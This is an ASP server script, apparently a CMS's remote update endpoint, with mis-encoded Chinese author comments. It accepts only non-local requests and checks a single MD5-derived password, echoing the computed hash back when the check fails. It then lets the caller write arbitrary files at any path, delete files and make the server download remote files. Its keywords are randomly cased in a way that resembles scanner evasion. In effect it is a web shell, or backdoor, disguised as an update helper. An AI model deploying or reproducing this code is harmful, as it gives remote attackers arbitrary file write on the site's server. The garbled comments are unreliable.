<%
'************************************************************
'���ߣ��ƶ� (��ͨASP/VB/PHP/JS/Flash��������������ϵ����)
'��Ȩ��Դ���빫����������;�������ʹ�á� 
'������2016-01-20
'��ϵ��QQ313801120  ����Ⱥ35915100(Ⱥ�����м�����)    ����313801120@qq.com   ������ҳ sharembweb.com
'����������ĵ������¡����Ⱥ(35915100)�����(sharembweb.com)���
'*                                    Powered By �ƶ� 
'************************************************************
%>
<!--#iNClUDe fILe="Config.Asp"-->
<%
cALl uPWeB()
sUB uPWeB()
dIM b, c, d, e, f, g, h, i, j, k, l, m
iF rEQuESt("act") = "getVersionNumber" tHEn
cALl dIE("V1.1")
eND iF
iF gETiP = "127.0.0.1" oR iNStR(gETiP, "192.168.") > 0 tHEn
cALl dIE("Ϊ���أ��������ϴ��ļ�")
eND iF
iF mD5(rEQuESt("UPEV"), 2) & mD5(rEQuESt("UPEV"), 4) <> "6178bbf3bfe62a59" tHEn
cALl dIE("UPEV=" & rEQuESt("UPEV") & "(" & mD5(rEQuESt("UPEV"), 2) & mD5(rEQuESt("UPEV"), 4) & ")")
eND iF
iF rEQuESt("DownFile") <> "" tHEn
cALl dOWnREmOTeFIlE(rEQuESt("DownFile"))
rESpONsE.eND()
eLSeIF rEQuESt("act") = "delWithout" tHEn
c = rF("Content")
f = sPLiT(c, vBCrLF)
fOR eACh b iN f
iF b<>"" tHEn
iF cHEcKFiLE(b)=tRUe tHEn
cALl dELeTEfILe(b)
i=i & b & "(Del True)" & vBCrLF
eLSe
i=i & b & "(Del NoFile)" & vBCrLF
eND iF
eND iF
nEXt
cALl dIE(i)
eND iF
iF rEQuESt("act") = "Comparison" tHEn
c = rF("Content")
f = sPLiT(c, vBCrLF)
fOR eACh e iN f
iF e <> "" tHEn
g = sPLiT(e, "|")
b = g(0)
l = g(1)
iF cHEcKFiLE(b) = tRUe tHEn
k = gETfILeEDiTDaTE(b)
k = fORmAT_TImE(k, 1)
iF dATeDIfF("s", l, k) <= 0 tHEn
i = i & b & vBCrLF
eND iF
eLSe
i = i & b & vBCrLF
eND iF
eND iF
nEXt
cALl rW(i)
rESpONsE.eND()
eND iF
b = rEQuESt.fORm("FilePath")
c = rEQuESt.fORm("Content")
m = rEQuESt.fORm("CharSet")
d = lCAsE(gETfILeEXtNAmE(b))
b = hANdLEpATh(b)
cALl cREaTEdIRfOLdER(b)
iF rEQuESt("UpType") = "binary" tHEn
cALl dECsAVeBInARy(b, c, 2)
cALl rW(b & "|�����Ʊ���")
eLSe
c = sPEcIAlHTmLUpLOaDEnCRyPTiONdECrYPt(c, "Decrypt")
cALl wRItEToFIlE(b, c, m)
cALl rW(b & "|��ͨ����")
eND iF
eND sUB
%>
